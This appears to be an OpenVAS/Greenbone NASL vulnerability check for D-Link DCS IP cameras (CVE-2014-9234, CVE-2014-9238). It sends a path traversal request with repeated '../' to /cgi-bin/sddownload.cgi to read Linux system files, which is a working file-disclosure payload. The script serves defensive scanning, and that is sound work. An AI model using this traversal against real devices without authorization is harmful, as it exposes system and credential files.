# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

# nb: Running against all DCS devices just to be sure as the vendor is known to usually have a wide
# range of affected devices even not actually mentioned as affected.
CPE_PREFIX = "cpe:/o:dlink:dcs";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805031");
  script_version("2025-06-27T15:42:32+0000");
  script_tag(name:"last_modification", value:"2025-06-27 15:42:32 +0000 (Fri, 27 Jun 2025)");
  script_tag(name:"creation_date", value:"2014-12-15 14:54:29 +0530 (Mon, 15 Dec 2014)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2014-9234", "CVE-2014-9238");

  script_name("D-Link DCS-2103 IP Camera Devices Multiple Vulnerabilities (Nov 2014) - Active Check");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_dlink_dcs_consolidation.nasl", "os_detection.nasl");
  script_mandatory_keys("d-link/dcs/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"D-Link DCS-2103 IP camera devices are prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2014-9234: The /cgi-bin/sddownload.cgi script is not properly sanitizing user input,
  specifically path traversal style attacks (e.g. '../') supplied via the 'file' parameter.

  - CVE-2014-9238: An input passed via the /cgi-bin/sddownload.cgi script to the 'file' parameter is
  not properly sanitized.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to disclose
  the software's installation path resulting in a loss of confidentiality and gain access to
  arbitrary files.");

  script_tag(name:"affected", value:"D-Link DCS-2103 IP camera devices with firmware versions 1.0.0
  and prior. Other models might be affected as well.");

  script_tag(name:"solution", value:"- D-Link DCS-2103 devices: Update to a firmware version 1.0.0

  - Other models: Please contact the vendor for more information");

  script_xref(name:"URL", value:"https://packetstorm.news/files/id/129138");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210116223145/http://www.securityfocus.com/bid/71484");
  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2014/Nov/42");

  exit(0);
}

include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if(!infos = get_app_port_from_cpe_prefix(cpe:CPE_PREFIX, service:"www"))
  exit(0);

port = infos["port"];
cpe = infos["cpe"];

if(!get_app_location(cpe:cpe, port:port, nofork:TRUE))
  exit(0);

# nb: Affected only on Linux
files = traversal_files("linux");

# nb: In the initial version of this VT this had only checked "/" here but this was completely wrong
# and has been rewritten like this. It is unknown so far if this flaw is authenticated (401 is seen
# on live targets) and it is kept like this here to cover both cases.
urls = make_list(
  "/",
  "/cgi-bin/sddownload.cgi?file="
);

foreach file(keys(files)) {

  foreach url(urls) {

    url += crap(data:"../", length:15) + files[file];

    if(http_vuln_check(port:port, url:url, pattern:file)) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
